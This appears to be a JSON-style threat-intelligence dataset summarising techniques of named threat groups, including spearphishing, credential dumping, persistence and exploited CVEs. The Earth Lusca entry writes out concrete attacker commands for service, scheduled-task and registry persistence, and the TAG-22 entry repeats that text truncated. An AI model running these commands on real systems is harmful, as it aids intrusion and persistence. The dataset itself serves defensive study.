    "Confucius": "Confucius is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013. Security researchers have noted similarities between Confucius and Patchwork, particularly in their respective custom malware code and targets., Confucius has obtained cloud storage service accounts to host stolen data., Confucius has used HTTP for C2 communications., Confucius has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg., Confucius has dropped malicious files into the startup folder %AppData%/Microsoft/Windows/Start Menu/Programs/Startup on a compromised host in order to maintain persistence., Confucius has used PowerShell to execute malicious files and payloads., Confucius has used VBScript to execute malicious code., Confucius has exfiltrated stolen files to its C2 server., Confucius has exfiltrated victim data to cloud storage service accounts., Confucius has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802., Confucius has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions., Confucius has downloaded additional files and payloads onto a compromised host following initial access., Confucius has crafted and sent victims malicious attachments to gain initial access., Confucius has sent malicious links to victims through email campaigns., Confucius has created scheduled tasks to maintain persistence on a compromised host., Confucius has used mshta.exe to execute malicious VBScript. , Confucius has used a file stealer that can examine system drives, including those other than the C drive., Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit., Confucius has lured victims into clicking on a malicious link sent through spearphishing., Confucius has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.",
    "CopyKittens": "CopyKittens is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip., CopyKittens uses ZPP, a .NET console program, to compress files with ZIP., CopyKittens encrypts data with a substitute cipher prior to exfiltration., CopyKittens has used PowerShell Empire., CopyKittens has used -w hidden and -windowstyle hidden to conceal PowerShell windows. , CopyKittens has used Metasploit, Empire, and AirVPN for post-exploitation activities., CopyKittens has used the AirVPN service for operational activity., CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared., CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.",
    "CURIUM": "CURIUM is an Iranian threat group, first reported in September 2019 and active since at least July 2018, targeting IT service providers in the Middle East. CURIUM has since invested in building relationships with potential targets via social media over a period of months to establish trust and confidence before sending malware. Security researchers note CURIUM has demonstrated great patience and persistence by chatting with potential targets daily and sending benign files to help lower their security consciousness., , , , , CURIUM created domains to facilitate strategic website compromise and credential capture activities., CURIUM created virtual private server instances to facilitate use of malicious domains and other items., CURIUM has created dedicated servers for command and control and exfiltration purposes., CURIUM has leveraged PowerShell scripts for initial process execution and data gathering in victim environments., CURIUM has compromised legitimate websites to enable strategic website compromise attacks., CURIUM has exfiltrated data from a compromised machine., CURIUM has used strategic website compromise to infect victims with malware such as IMAPLoader., CURIUM has established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman., CURIUM has created dedicated email accounts for use with tools such as IMAPLoader., CURIUM has used SMTPS to exfiltrate collected data from victims., CURIUM has used IMAP and SMTPS for exfiltration via tools such as IMAPLoader., CURIUM has used phishing with malicious attachments for initial access to victim environments., CURIUM has used social media to deliver malicious files to victims., CURIUM used malicious links to adversary-controlled resources for credential harvesting., CURIUM has been linked to web shells following likely server compromise as an initial access vector into victim networks., CURIUM used strategic website compromise to fingerprint then target victims., CURIUM deploys information gathering tools focused on capturing IP configuration, running application, system information, and network connectivity information., CURIUM deployed mechanisms to check system time information following strategic website compromise attacks., CURIUM has lured users into opening malicious files delivered via social media.",
    "CyberAv3ngers": "The CyberAv3ngers are a suspected Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated APT group. The CyberAv3ngers have been known to be active since at least 2020, with disputed and false claims of critical infrastructure compromises in Israel., In 2023, the CyberAv3ngers engaged in a global targeting and hacking of the Unitronics Programmable Logic Controller (PLC) with Human-Machine Interface (HMI). This PLC can be found in multiple sectors, including water and wastewater, energy, food and beverage manufacturing, and healthcare. The most notable feature of this attack was the defacement of the devices user interface., CyberAv3ngers reportedly has connections to the IRGC-linked group Soldiers of Solomon., , During the Unitronics Defacement Campaign, the CyberAv3ngers discovered and exploited default credentials found on many Unitronics Programmable Logic Controller (PLC) Human-Machine Interface (HMI). For many of these devices, the default password was set to ‘1111’., During the Unitronics Defacement Campaign, the CyberAv3ngers defaced controllers’ Human-Machine Interface (HMI), which prevented multiple entities from being able to operate their devices normally. Additionally, the CyberAv3ngers caused a communications failure in a remote pumping station., During the Unitronics Defacement Campaign, the CyberAv3ngers exploited devices connected to the public internet, such as internet connected Unitronics Programmable Logic Controller (PLC) with Human-Machine Interface (HMI) and networking equipment such as cellular modems found in OT environments., During the Unitronics Defacement Campaign, the CyberAv3ngers caused multiple businesses to halt operations due to the unavailability of the Programmable Logic Controller (PLC) and Human-Machine Interface (HMI). These victims covered multiple sectors., During the Unitronics Defacement Campaign, the CyberAv3ngers caused multiple businesses to halt operations in their industrial environments, impacting their typical business operations. These victims covered multiple sectors., During the Unitronics Defacement Campaign, the CyberAv3ngers replaced the existing graphic on the Programmable Logic Controller (PLC) Human-Machine Interface (HMI) with their own, thereby preventing PLC owners and operators from viewing PLC information on the HMI.",
    "Daggerfly": "Daggerfly is a People's Republic of China-linked APT entity active since at least 2012. Daggerfly has targeted individuals, government and NGO entities, and telecommunication companies in Asia and Africa. Daggerfly is associated with exclusive use of MgBot malware and is noted for several potential supply chain infection campaigns., , , Daggerfly uses HTTP for command and control communication., Daggerfly used PowerShell to download and execute remote-hosted files on victim systems., Daggerfly compromised web servers hosting updates for software as part of a supply chain intrusion., Daggerfly created a local account on victim machines to maintain access., Daggerfly created code signing certificates to sign malicious macOS files., Daggerfly has used strategic website compromise for initial access against victims., Daggerfly has used legitimate software to side-load PlugX loaders onto victim systems. Daggerfly is also linked to multiple other instances of side-loading for initial loading activity., Daggerfly has used PowerShell and BITSAdmin to retrieve follow-on payloads from external locations for execution on victim machines., Daggerfly used a renamed version of rundll32.exe, such as 'dbengin.exe' located in the ProgramData/Microsoft/PlayReady directory, to proxy malicious DLL execution., Daggerfly used Reg to dump the Security Account Manager (SAM) hive from victim machines for follow-on credential extraction., Daggerfly used Reg to dump the Security Account Manager (SAM), System, and Security Windows registry hives from victim machines., Daggerfly has attempted to use scheduled tasks for persistence in victim environments., Daggerfly has used signed, but not notarized, malicious files for execution in macOS environments., Daggerfly is associated with several supply chain compromises using malicious updates to compromise victims., Daggerfly proxied execution of malicious DLLs through a renamed rundll32.exe binary., Daggerfly utilizes victim machine operating system information to create custom User Agent strings for subsequent command and control communication., Daggerfly has used strategic website compromise to deliver a malicious link requiring user interaction.",
    "Dark Caracal": "Dark Caracal is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. , Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string '&&&'., Dark Caracal's version of Bandook adds a registry key to HKEY_USERS/Software/Microsoft/Windows/CurrentVersion/Run for persistence., Dark Caracal has used macros in Word documents that would download a second stage if executed., Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems., Dark Caracal leveraged a watering hole to serve up malicious code., Dark Caracal collected file listings of all default Windows directories., Dark Caracal has used UPX to pack Bandook., Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them., Dark Caracal spearphished victims via Facebook and Whatsapp., Dark Caracal took screenshots using their Windows malware., Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable., Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it., Dark Caracal controls implants using standard HTTP communication.",
    "Darkhotel": "Darkhotel is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. Darkhotel has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks., , , Darkhotel has been known to establish persistence by adding programs to the Run Registry key., Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file., Darkhotel has decrypted strings and imports using RC4 during execution., Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware., Darkhotel has used AES-256 and 3DES for C2 communications., Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution., Darkhotel has used malware that searched for files with specific patterns., Darkhotel has used first-stage payloads that download additional malware from C2 servers., Darkhotel has used a keylogger., Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool., Darkhotel has obfuscated code using RC4, XOR, and RSA., Darkhotel has sent spearphishing emails with malicious RAR and .LNK attachments., Darkhotel malware can collect a list of running processes on a system., Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers., Darkhotel has searched for anti-malware strings and anti-virus processes running on the system. , Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them., Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine., Darkhotel has collected the IP address and network adapter information from the victim’s machine., Darkhotel malware can obtain system time from a compromised host., Darkhotel used a virus that propagates by infecting executables stored on shared drives., Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments., Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection., Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:/ drive, as well as checks for sandbox-related libraries., Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.",
    "DarkHydrus": "DarkHydrus is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks.  , DarkHydrus leveraged PowerShell to download and execute additional scripts for execution., DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials., DarkHydrus has used -WindowStyle Hidden to conceal PowerShell windows. , DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike., DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the 'attachedTemplate' technique to load a template from a remote server., DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication., DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.",
    "DarkVishnya": "DarkVishnya is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region., DarkVishnya used brute-force attack to obtain login data., DarkVishnya used PowerShell to create shellcode loaders., DarkVishnya created new services for shellcode loaders distribution., DarkVishnya used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network., DarkVishnya performed port scanning to obtain the list of active services., DarkVishnya scanned the network for public shared folders., DarkVishnya used network sniffing to obtain login data. , DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2., DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec., DarkVishnya used DameWare Mini Remote Control for lateral movement.",
    "Deep Panda": "Deep Panda is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications.  The intrusion into healthcare company Anthem has been attributed to Deep Panda.  This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther.  Deep Panda also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion.  Some analysts track Deep Panda and APT19 as the same group, but it is unclear from open source information if the groups are the same. , , , , , , Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk., Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions., Deep Panda has used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. , Deep Panda has updated and modified its malware, resulting in different hash values that evade detection., Deep Panda uses the Microsoft Tasklist utility to list processes running on systems., Deep Panda uses net.exe to connect to network shares using net use commands with compromised credentials., Deep Panda has used ping to identify other machines of interest., Deep Panda uses Web shells on publicly accessible Web servers to access victim networks., Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks., The Deep Panda group is known to utilize WMI for lateral movement.",
    "Dragonfly": "Dragonfly is a cyber espionage group that has been attributed to Russia's Federal Security Service (FSB) Center 16. Active since at least 2010, Dragonfly has targeted defense and aviation companies, government entities, companies related to industrial control systems, and critical infrastructure sectors worldwide through supply chain, spearphishing, and drive-by compromise attacks., , , , , , , , , , Dragonfly has used batch scripts to enumerate users on a victim domain controller., Dragonfly has added newly created accounts to the administrators group to maintain elevated access., Dragonfly has registered domains for targeting intended victims., Dragonfly has acquired VPS infrastructure for use in malicious campaigns., Dragonfly has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services., Dragonfly has used SMB for C2., Dragonfly has compressed data into .zip files prior to exfiltration., Dragonfly has added the registry value ntdll to the Registry Run key to establish persistence., Dragonfly has attempted to brute force credentials to gain access., Dragonfly has dropped and executed tools used for password cracking, including Hydra and CrackMapExec., Dragonfly has used the command line for execution., Dragonfly has used PowerShell scripts for execution., Dragonfly has used various types of scripting to perform operations, including batch scripts., Dragonfly has used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim., Dragonfly has compromised legitimate websites to host C2 and malware modules., Dragonfly has created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target., Dragonfly has collected data from local victim systems., Dragonfly has created a directory named 'out' in the user's %AppData% folder and copied files to it., Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit., Dragonfly has accessed email accounts using Outlook Web Access., Dragonfly has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs., Dragonfly has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system., Dragonfly has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers., Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks., Dragonfly has used a batch script to gather folder and file names from victim hosts., Dragonfly has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems., Dragonfly has collected open source information to identify relationships between organizations for targeting purposes., Dragonfly has modified the Registry to hide created user accounts., Dragonfly has disabled host-based firewalls. The group has also globally opened port 3389., Dragonfly has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys., Dragonfly has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots., Dragonfly has copied and installed tools for operations once in the victim environment., Dragonfly has created accounts disguised as legitimate backup and service accounts as well as an email administration account., Dragonfly has modified the Registry to perform multiple techniques through the use of Reg., Dragonfly has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems., Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec., Dragonfly has dropped and executed SecretsDump to dump password hashes., Dragonfly has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers., Dragonfly has dropped and executed SecretsDump to dump password hashes., Dragonfly has used batch scripts to enumerate administrators and users in the domain., Dragonfly has sent emails with malicious attachments to gain initial access., Dragonfly has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials., Dragonfly has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites., Dragonfly has queried the Registry to identify victim information., Dragonfly has moved laterally via RDP., Dragonfly has likely obtained a list of hosts in the victim environment., Dragonfly has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files., Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil)., Dragonfly has commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files., Dragonfly has compromised websites to redirect traffic and to host exploit kits., Dragonfly has placed trojanized installers for control system software on legitimate vendor app stores., Dragonfly has used batch scripts to enumerate network information, including information about trusts, zones, and the domain., Dragonfly used the command query user on victim hosts., Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication., Dragonfly has used various forms of spearphishing in attempts to get users to open malicious attachments., Dragonfly has compromised user credentials and used valid accounts for operations., Dragonfly utilized watering hole attacks on energy sector websites by injecting a redirect iframe to deliver Backdoor.Oldrea or Trojan.Karagany. , Dragonfly trojanized legitimate ICS equipment providers software packages available for download on their websites.",
    "DragonOK": "DragonOK is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, DragonOK is thought to have a direct or indirect relationship with the threat group Moafee.  It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT.",
    "Earth Lusca": "Earth Lusca is a suspected China-based cyber espionage group that has been active since at least April 2019. Earth Lusca has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some Earth Lusca operations may be financially motivated., Earth Lusca has used malware commonly used by other Chinese threat groups, including APT41 and the Winnti Group cluster, however security researchers assess Earth Lusca's techniques and infrastructure are separate., , ,  , , Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges., Earth Lusca has dropped an SSH-authorized key in the /root/.ssh folder in order to access a compromised server with SSH., Earth Lusca has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks. , Earth Lusca has acquired multiple servers for some of their operations, using each server for a different role., Earth Lusca has established GitHub accounts to host their malware., Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets., Earth Lusca has used WinRAR to compress stolen files into an archive prior to exfiltration., Earth Lusca has added the Registry key HKLM/SYSTEM/ControlSet001/Control/Print/Environments/Windows x64/Print Processors/UDPrint' /v Driver /d 'spool.dll /f to load malware as a Print Processor., Earth Lusca has used PowerShell to execute commands., Earth Lusca used VBA scripts., Earth Lusca used Python scripts for port scanning or building reverse shells., Earth Lusca has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations., Earth Lusca has used compromised web servers as part of their operational infrastructure., Earth Lusca has compromised Google Drive repositories., Earth Lusca created a service using the command sc create 'SysUpdate' binpath= 'cmd /c start '[file path]''&&sc config 'SysUpdate' start= auto&&netstart SysUpdate for persistence., Earth Lusca has used certutil to decode a string into a cabinet file., Earth Lusca has used Nltest to obtain information about domain controllers., Earth Lusca has performed watering hole attacks., Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA., Earth Lusca has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish., Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472)., Earth Lusca has placed a malicious payload in %WINDIR%/SYSTEM32/oci.dll so it would be sideloaded by the MSDTC service. , Earth Lusca used the command move [file path] c:/windows/system32/spool/prtprocs/x64/spool.dll to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service., Earth Lusca modified the registry using the command reg add 'HKEY_CURRENT_USER/Environment' /v UserInitMprLogonScript /t REG_SZ /d '[file path]' for persistence., Earth Lusca used Base64 to encode strings., Earth Lusca has used steganography to hide shellcode in a BMP image file., Earth Lusca has acquired and used a variety of malware, including Cobalt Strike., Earth Lusca has acquired and used a variety of open source tools., Earth Lusca has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process., Earth Lusca has used a DCSync command with Mimikatz to retrieve credentials from an exploited controller., Earth Lusca has sent spearphishing emails to potential targets that contained a malicious link., Earth Lusca has used Tasklist to obtain information from a compromised host., Earth Lusca adopted Cloudflare as a proxy for compromised servers., Earth Lusca used the command powershell 'Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr 'Address'' to find the network information of successfully logged-in accounts to discovery addresses of other machines. Earth Lusca has also used multiple scanning tools to discover other machines within the same compromised network., Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR '[file path]' /ru system for persistence., Earth Lusca has staged malware and malicious files on compromised web servers, GitHub, and Google Drive., Earth Lusca has used mshta.exe to load an HTA script within a malicious .LNK file., Earth Lusca used the command ipconfig to obtain information about network configurations., Earth Lusca employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log 'Microsoft-Windows-TerminalServices-RDPClient/Operational'(Event ID 1024) to obtain network information from RDP connections. Earth Lusca has also used netstat from a compromised system to obtain network connection information., Earth Lusca collected information on user accounts via the whoami command., Earth Lusca has used Tasklist to obtain information from a compromised host., Earth Lusca  has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader., Earth Lusca required users to click on a malicious file for the loader to activate., Earth Lusca used a VBA script to execute WMI.",
    "TAG-22": " Earth Lusca has used malware commonly used by other Chinese threat groups, including APT41 and the Winnti Group cluster, however security researchers assess Earth Lusca's techniques and infrastructure are separate., , ,  , , Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges., Earth Lusca has dropped an SSH-authorized key in the /root/.ssh folder in order to access a compromised server with SSH., Earth Lusca has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks. , Earth Lusca has acquired multiple servers for some of their operations, using each server for a different role., Earth Lusca has established GitHub accounts to host their malware., Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets., Earth Lusca has used WinRAR to compress stolen files into an archive prior to exfiltration., Earth Lusca has added the Registry key HKLM/SYSTEM/ControlSet001/Control/Print/Environments/Windows x64/Print Processors/UDPrint' /v Driver /d 'spool.dll /f to load malware as a Print Processor., Earth Lusca has used PowerShell to execute commands., Earth Lusca used VBA scripts., Earth Lusca used Python scripts for port scanning or building reverse shells., Earth Lusca has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations., Earth Lusca has used compromised web servers as part of their operational infrastructure., Earth Lusca has compromised Google Drive repositories., Earth Lusca created a service using the command sc create 'SysUpdate' binpath= 'cmd /c start '[file path]''&&sc config 'SysUpdate' start= auto&&netstart SysUpdate for persistence., Earth Lusca has used certutil to decode a string into a cabinet file., Earth Lusca has used Nltest to obtain information about domain controllers., Earth Lusca has performed watering hole attacks., Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA., Earth Lusca has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish., Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).",
    "Elderwood": "Elderwood is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora.  The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers.  ,  , , , Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector., Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits., The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location., Elderwood has packed malware payloads before delivery to victims., Elderwood has encrypted documents and malicious executables., Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments., Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server., Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links., Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.",
    "Ember Bear": "Ember Bear is a Russian state-sponsored cyber espionage group that has been active since at least 2020, linked to Russia's General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155). Ember Bear has primarily focused operations against Ukrainian government and telecommunication entities, but has also operated against critical infrastructure entities in Europe and the Americas. Ember Bear conducted the WhisperGate destructive wiper attacks against Ukraine in early 2022. There is some confusion as to whether Ember Bear overlaps with another Russian-linked entity referred to as Saint Bear. At present available evidence strongly suggests these are distinct activities with different behavioral profiles., , , , , , , Ember Bear uses services such as IVPN, SurfShark, and Tor to add anonymization to operations., Ember Bear has used virtual private servers (VPSs) to host tools, perform reconnaissance, exploit victim infrastructure, and as a destination for data exfiltration., Ember Bear has targeted IP ranges for vulnerability scanning related to government and critical infrastructure organizations., Ember Bear has used publicly available tools such as MASSCAN and Acunetix for vulnerability scanning of public-facing infrastructure., Ember Bear has used DNS tunnelling tools, such as dnscat/2 and Iodine, for C2 purposes., Ember Bear has compressed collected data prior to exfiltration., Ember Bear engages in mass collection from compromised systems during intrusions., Ember Bear used the su-bruteforce tool to brute force specific users using the su command., Ember Bear has conducted password spraying against Outlook Web Access (OWA) infrastructure to identify valid user names and passwords., Ember Bear has used PowerShell commands to gather information from compromised systems,  such as email servers., Ember Bear gathers victim system information such as enumerating the volume of a given device or extracting system and security event logs for analysis., Ember Bear is linked to the defacement of several Ukrainian organization websites., Ember Bear conducted destructive operations against victims, including disk structure wiping, via the WhisperGate malware in Ukraine., Ember Bear attempts to collect mail from accessed systems and servers., Ember Bear has created accounts on dark web forums to obtain various tools and malware., Ember Bear has used tools such as Rclone to exfiltrate information from victim environments to cloud storage such as mega.nz., Ember Bear gains initial access to victim environments by exploiting external-facing services. Examples include exploitation of CVE-2021-26084 in Confluence servers; CVE-2022-41040, ProxyShell, and other vulnerabilities in Microsoft Exchange; and multiple vulnerabilities in open-source platforms such as content management systems., Ember Bear has used exploits to enable follow-on execution of frameworks such as Meterpreter., Ember Bear has used exploits for vulnerabilities such as MS17-010, also known as Eternal Blue, during operations., Ember Bear have used VPNs both for initial access to victim environments and for persistence within them following compromise., Ember Bear uses the NirSoft AdvancedRun utility to disable Microsoft Defender Antivirus through stopping the WinDefend service on victim machines. Ember Bear disables Windows Defender via registry key changes., Ember Bear deletes files related to lateral movement to avoid detection., Ember Bear retrieves follow-on payloads direct from adversary-owned infrastructure for deployment on compromised hosts., Ember Bear has enumerated SECURITY and SYSTEM log files during intrusions., Ember Bear has renamed the legitimate Sysinternals tool procdump to alternative names such as dump64.exe to evade detection., Ember Bear has renamed tools to match legitimate utilities, such as renaming GOST tunneling instances to java in victim environments., Ember Bear modifies registry values for anti-forensics and defense evasion purposes., Ember Bear has used tools such as NMAP for remote system discovery and enumeration in victim environments., Ember Bear uses socket-based tunneling utilities for command and control purposes such as NetCat and Go Simple Tunnel (GOST). These tunnels are used to push interactive command prompts over the created sockets. Ember Bear has also used reverse TCP connections from Meterpreter installations to communicate back with C2 infrastructure., Ember Bear has used various non-standard ports for C2 communication., Ember Bear has acquired malware and related tools from dark web forums., Ember Bear has obtained exploitation scripts against publicly-disclosed vulnerabilities from public repositories., Ember Bear gathers credential material from target systems, such as SSH keys, to facilitate access to victim environments., Ember Bear uses legitimate Sysinternals tools such as procdump to dump LSASS memory., Ember Bear acquires victim credentials by extracting registry hives such as the Security Account Manager through commands such as reg save., Ember Bear has used frameworks such as Impacket to dump LSA secrets for credential capture., Ember Bear has used ProxyChains to tunnel protocols to internal networks., Ember Bear has configured multi-hop proxies via ProxyChains within victim environments., Ember Bear uses valid network credentials gathered through credential harvesting to move laterally within victim networks, often employing the Impacket framework to do so., Ember Bear has used tools such as Nmap and MASSCAN for remote service discovery., Ember Bear uses remotely scheduled tasks to facilitate remote command execution on victim machines., Ember Bear deploys web shells following initial access for either follow-on command execution or protocol tunneling. Example web shells used by Ember Bear include P0wnyshell, reGeorg, P.A.S. Webshell, and custom variants of publicly-available web shell examples., Ember Bear has compromised information technology providers and software developers providing services to targets of interest, building initial access to ultimate victims at least in part through compromise of service providers that work with the victim organizations., Ember Bear has dumped configuration settings in accessed IP cameras including plaintext credentials., Ember Bear has used pass-the-hash techniques for lateral movement in victim environments., Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access., Ember Bear has exfiltrated images from compromised IP cameras., Ember Bear has used WMI execution with password hashes for command execution and lateral movement.",
    "Equation": "Equation is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. , Equation has been observed utilizing environmental keying in payload delivery., Equation has used an encrypted virtual file system stored in the Windows Registry., Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware., Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers.",
    "Evilnum": "Evilnum is a financially motivated threat group that has been active since at least 2018., Evilnum has used PowerShell to bypass UAC., Evilnum has used malicious JavaScript files on the victim's machine., Evilnum can collect email credentials from victims., Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder. , Evilnum has deleted files used during infection., Evilnum can deploy additional components or tools as needed., Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive., EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines., Evilnum can steal cookies and session information from browsers., Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file., Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments.",
